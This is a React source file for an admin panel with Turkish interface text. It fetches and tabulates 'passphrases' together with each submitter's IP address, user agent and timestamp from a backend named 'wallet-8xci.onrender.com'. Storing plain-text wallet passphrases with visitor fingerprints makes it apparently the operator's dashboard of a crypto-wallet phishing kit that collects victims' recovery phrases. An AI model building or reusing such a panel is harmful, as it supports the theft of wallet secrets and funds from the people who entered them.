import React, { useState, useEffect } from 'react';
import styled from 'styled-components';

const Container = styled.div`
  max-width: 1200px;
  margin: 20px auto;
  padding: 20px;
`;

const Header = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
`;

const Title = styled.h2`
  color: #333;
`;

const LogoutButton = styled.button`
  padding: 10px 20px;
  background-color: #f44336;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  &:hover {
    background-color: #d32f2f;
  }
`;

const Table = styled.table`
  width: 100%;
  border-collapse: collapse;
  margin-top: 20px;
`;

const Th = styled.th`
  background-color: #f5f5f5;
  padding: 12px;
  text-align: left;
  border-bottom: 2px solid #ddd;
`;

const Td = styled.td`
  padding: 12px;
  border-bottom: 1px solid #ddd;
`;

const Error = styled.div`
  color: red;
  text-align: center;
  margin: 20px 0;
`;

const HeaderButtons = styled.div`
  display: flex;
  gap: 10px;
`;

const RefreshButton = styled.button`
  padding: 10px 20px;
  background-color: #4CAF50;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 5px;
  
  &:hover {
    background-color: #45a049;
  }

  &:disabled {
    background-color: #cccccc;
    cursor: not-allowed;
  }
`;

const LoadingSpinner = styled.div`
  width: 16px;
  height: 16px;
  border: 2px solid #ffffff;
  border-top: 2px solid transparent;
  border-radius: 50%;
  animation: spin 1s linear infinite;

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
`;

function AdminPanel({ token, onLogout }) {
  const [passphrases, setPassphrases] = useState([]);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const API_URL = process.env.NODE_ENV === 'production' 
    ? 'https://wallet-8xci.onrender.com'
    : 'http://localhost:3001';

  const fetchPassphrases = async () => {
    setIsLoading(true);
    setError('');
    
    try {
      const response = await fetch(`${API_URL}/api/admin/passphrases`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });

      const data = await response.json();
      if (data.success) {
        setPassphrases(data.data);
      } else {
        setError('Veriler alınamadı');
      }
    } catch (error) {
      setError('Veriler yüklenirken bir hata oluştu');
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchPassphrases();
  }, [token]);

  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    onLogout();
  };

  return (
    <Container>
      <Header>
        <Title>Admin Paneli - Passphrase Listesi</Title>
        <HeaderButtons>
          <RefreshButton 
            onClick={fetchPassphrases} 
            disabled={isLoading}
          >
            {isLoading ? <LoadingSpinner /> : '🔄'}
            {isLoading ? 'Yenileniyor...' : 'Yenile'}
          </RefreshButton>
          <LogoutButton onClick={handleLogout}>Çıkış Yap</LogoutButton>
        </HeaderButtons>
      </Header>

      {error && <Error>{error}</Error>}

      <Table>
        <thead>
          <tr>
            <Th>ID</Th>
            <Th>Passphrase</Th>
            <Th>IP Adresi</Th>
            <Th>User Agent</Th>
            <Th>Tarih</Th>
          </tr>
        </thead>
        <tbody>
          {passphrases.map((item) => (
            <tr key={item.id}>
              <Td>{item.id}</Td>
              <Td>{item.passphrase}</Td>
              <Td>{item.ip}</Td>
              <Td>{item.userAgent}</Td>
              <Td>{item.createdAt ? new Date(item.createdAt).toLocaleString('tr-TR') : '-'}</Td>
            </tr>
          ))}
          {passphrases.length === 0 && !isLoading && (
            <tr>
              <Td colSpan="5" style={{ textAlign: 'center' }}>
                Henüz kayıtlı veri bulunmuyor
              </Td>
            </tr>
          )}
        </tbody>
      </Table>
    </Container>
  );
}

export default AdminPanel; 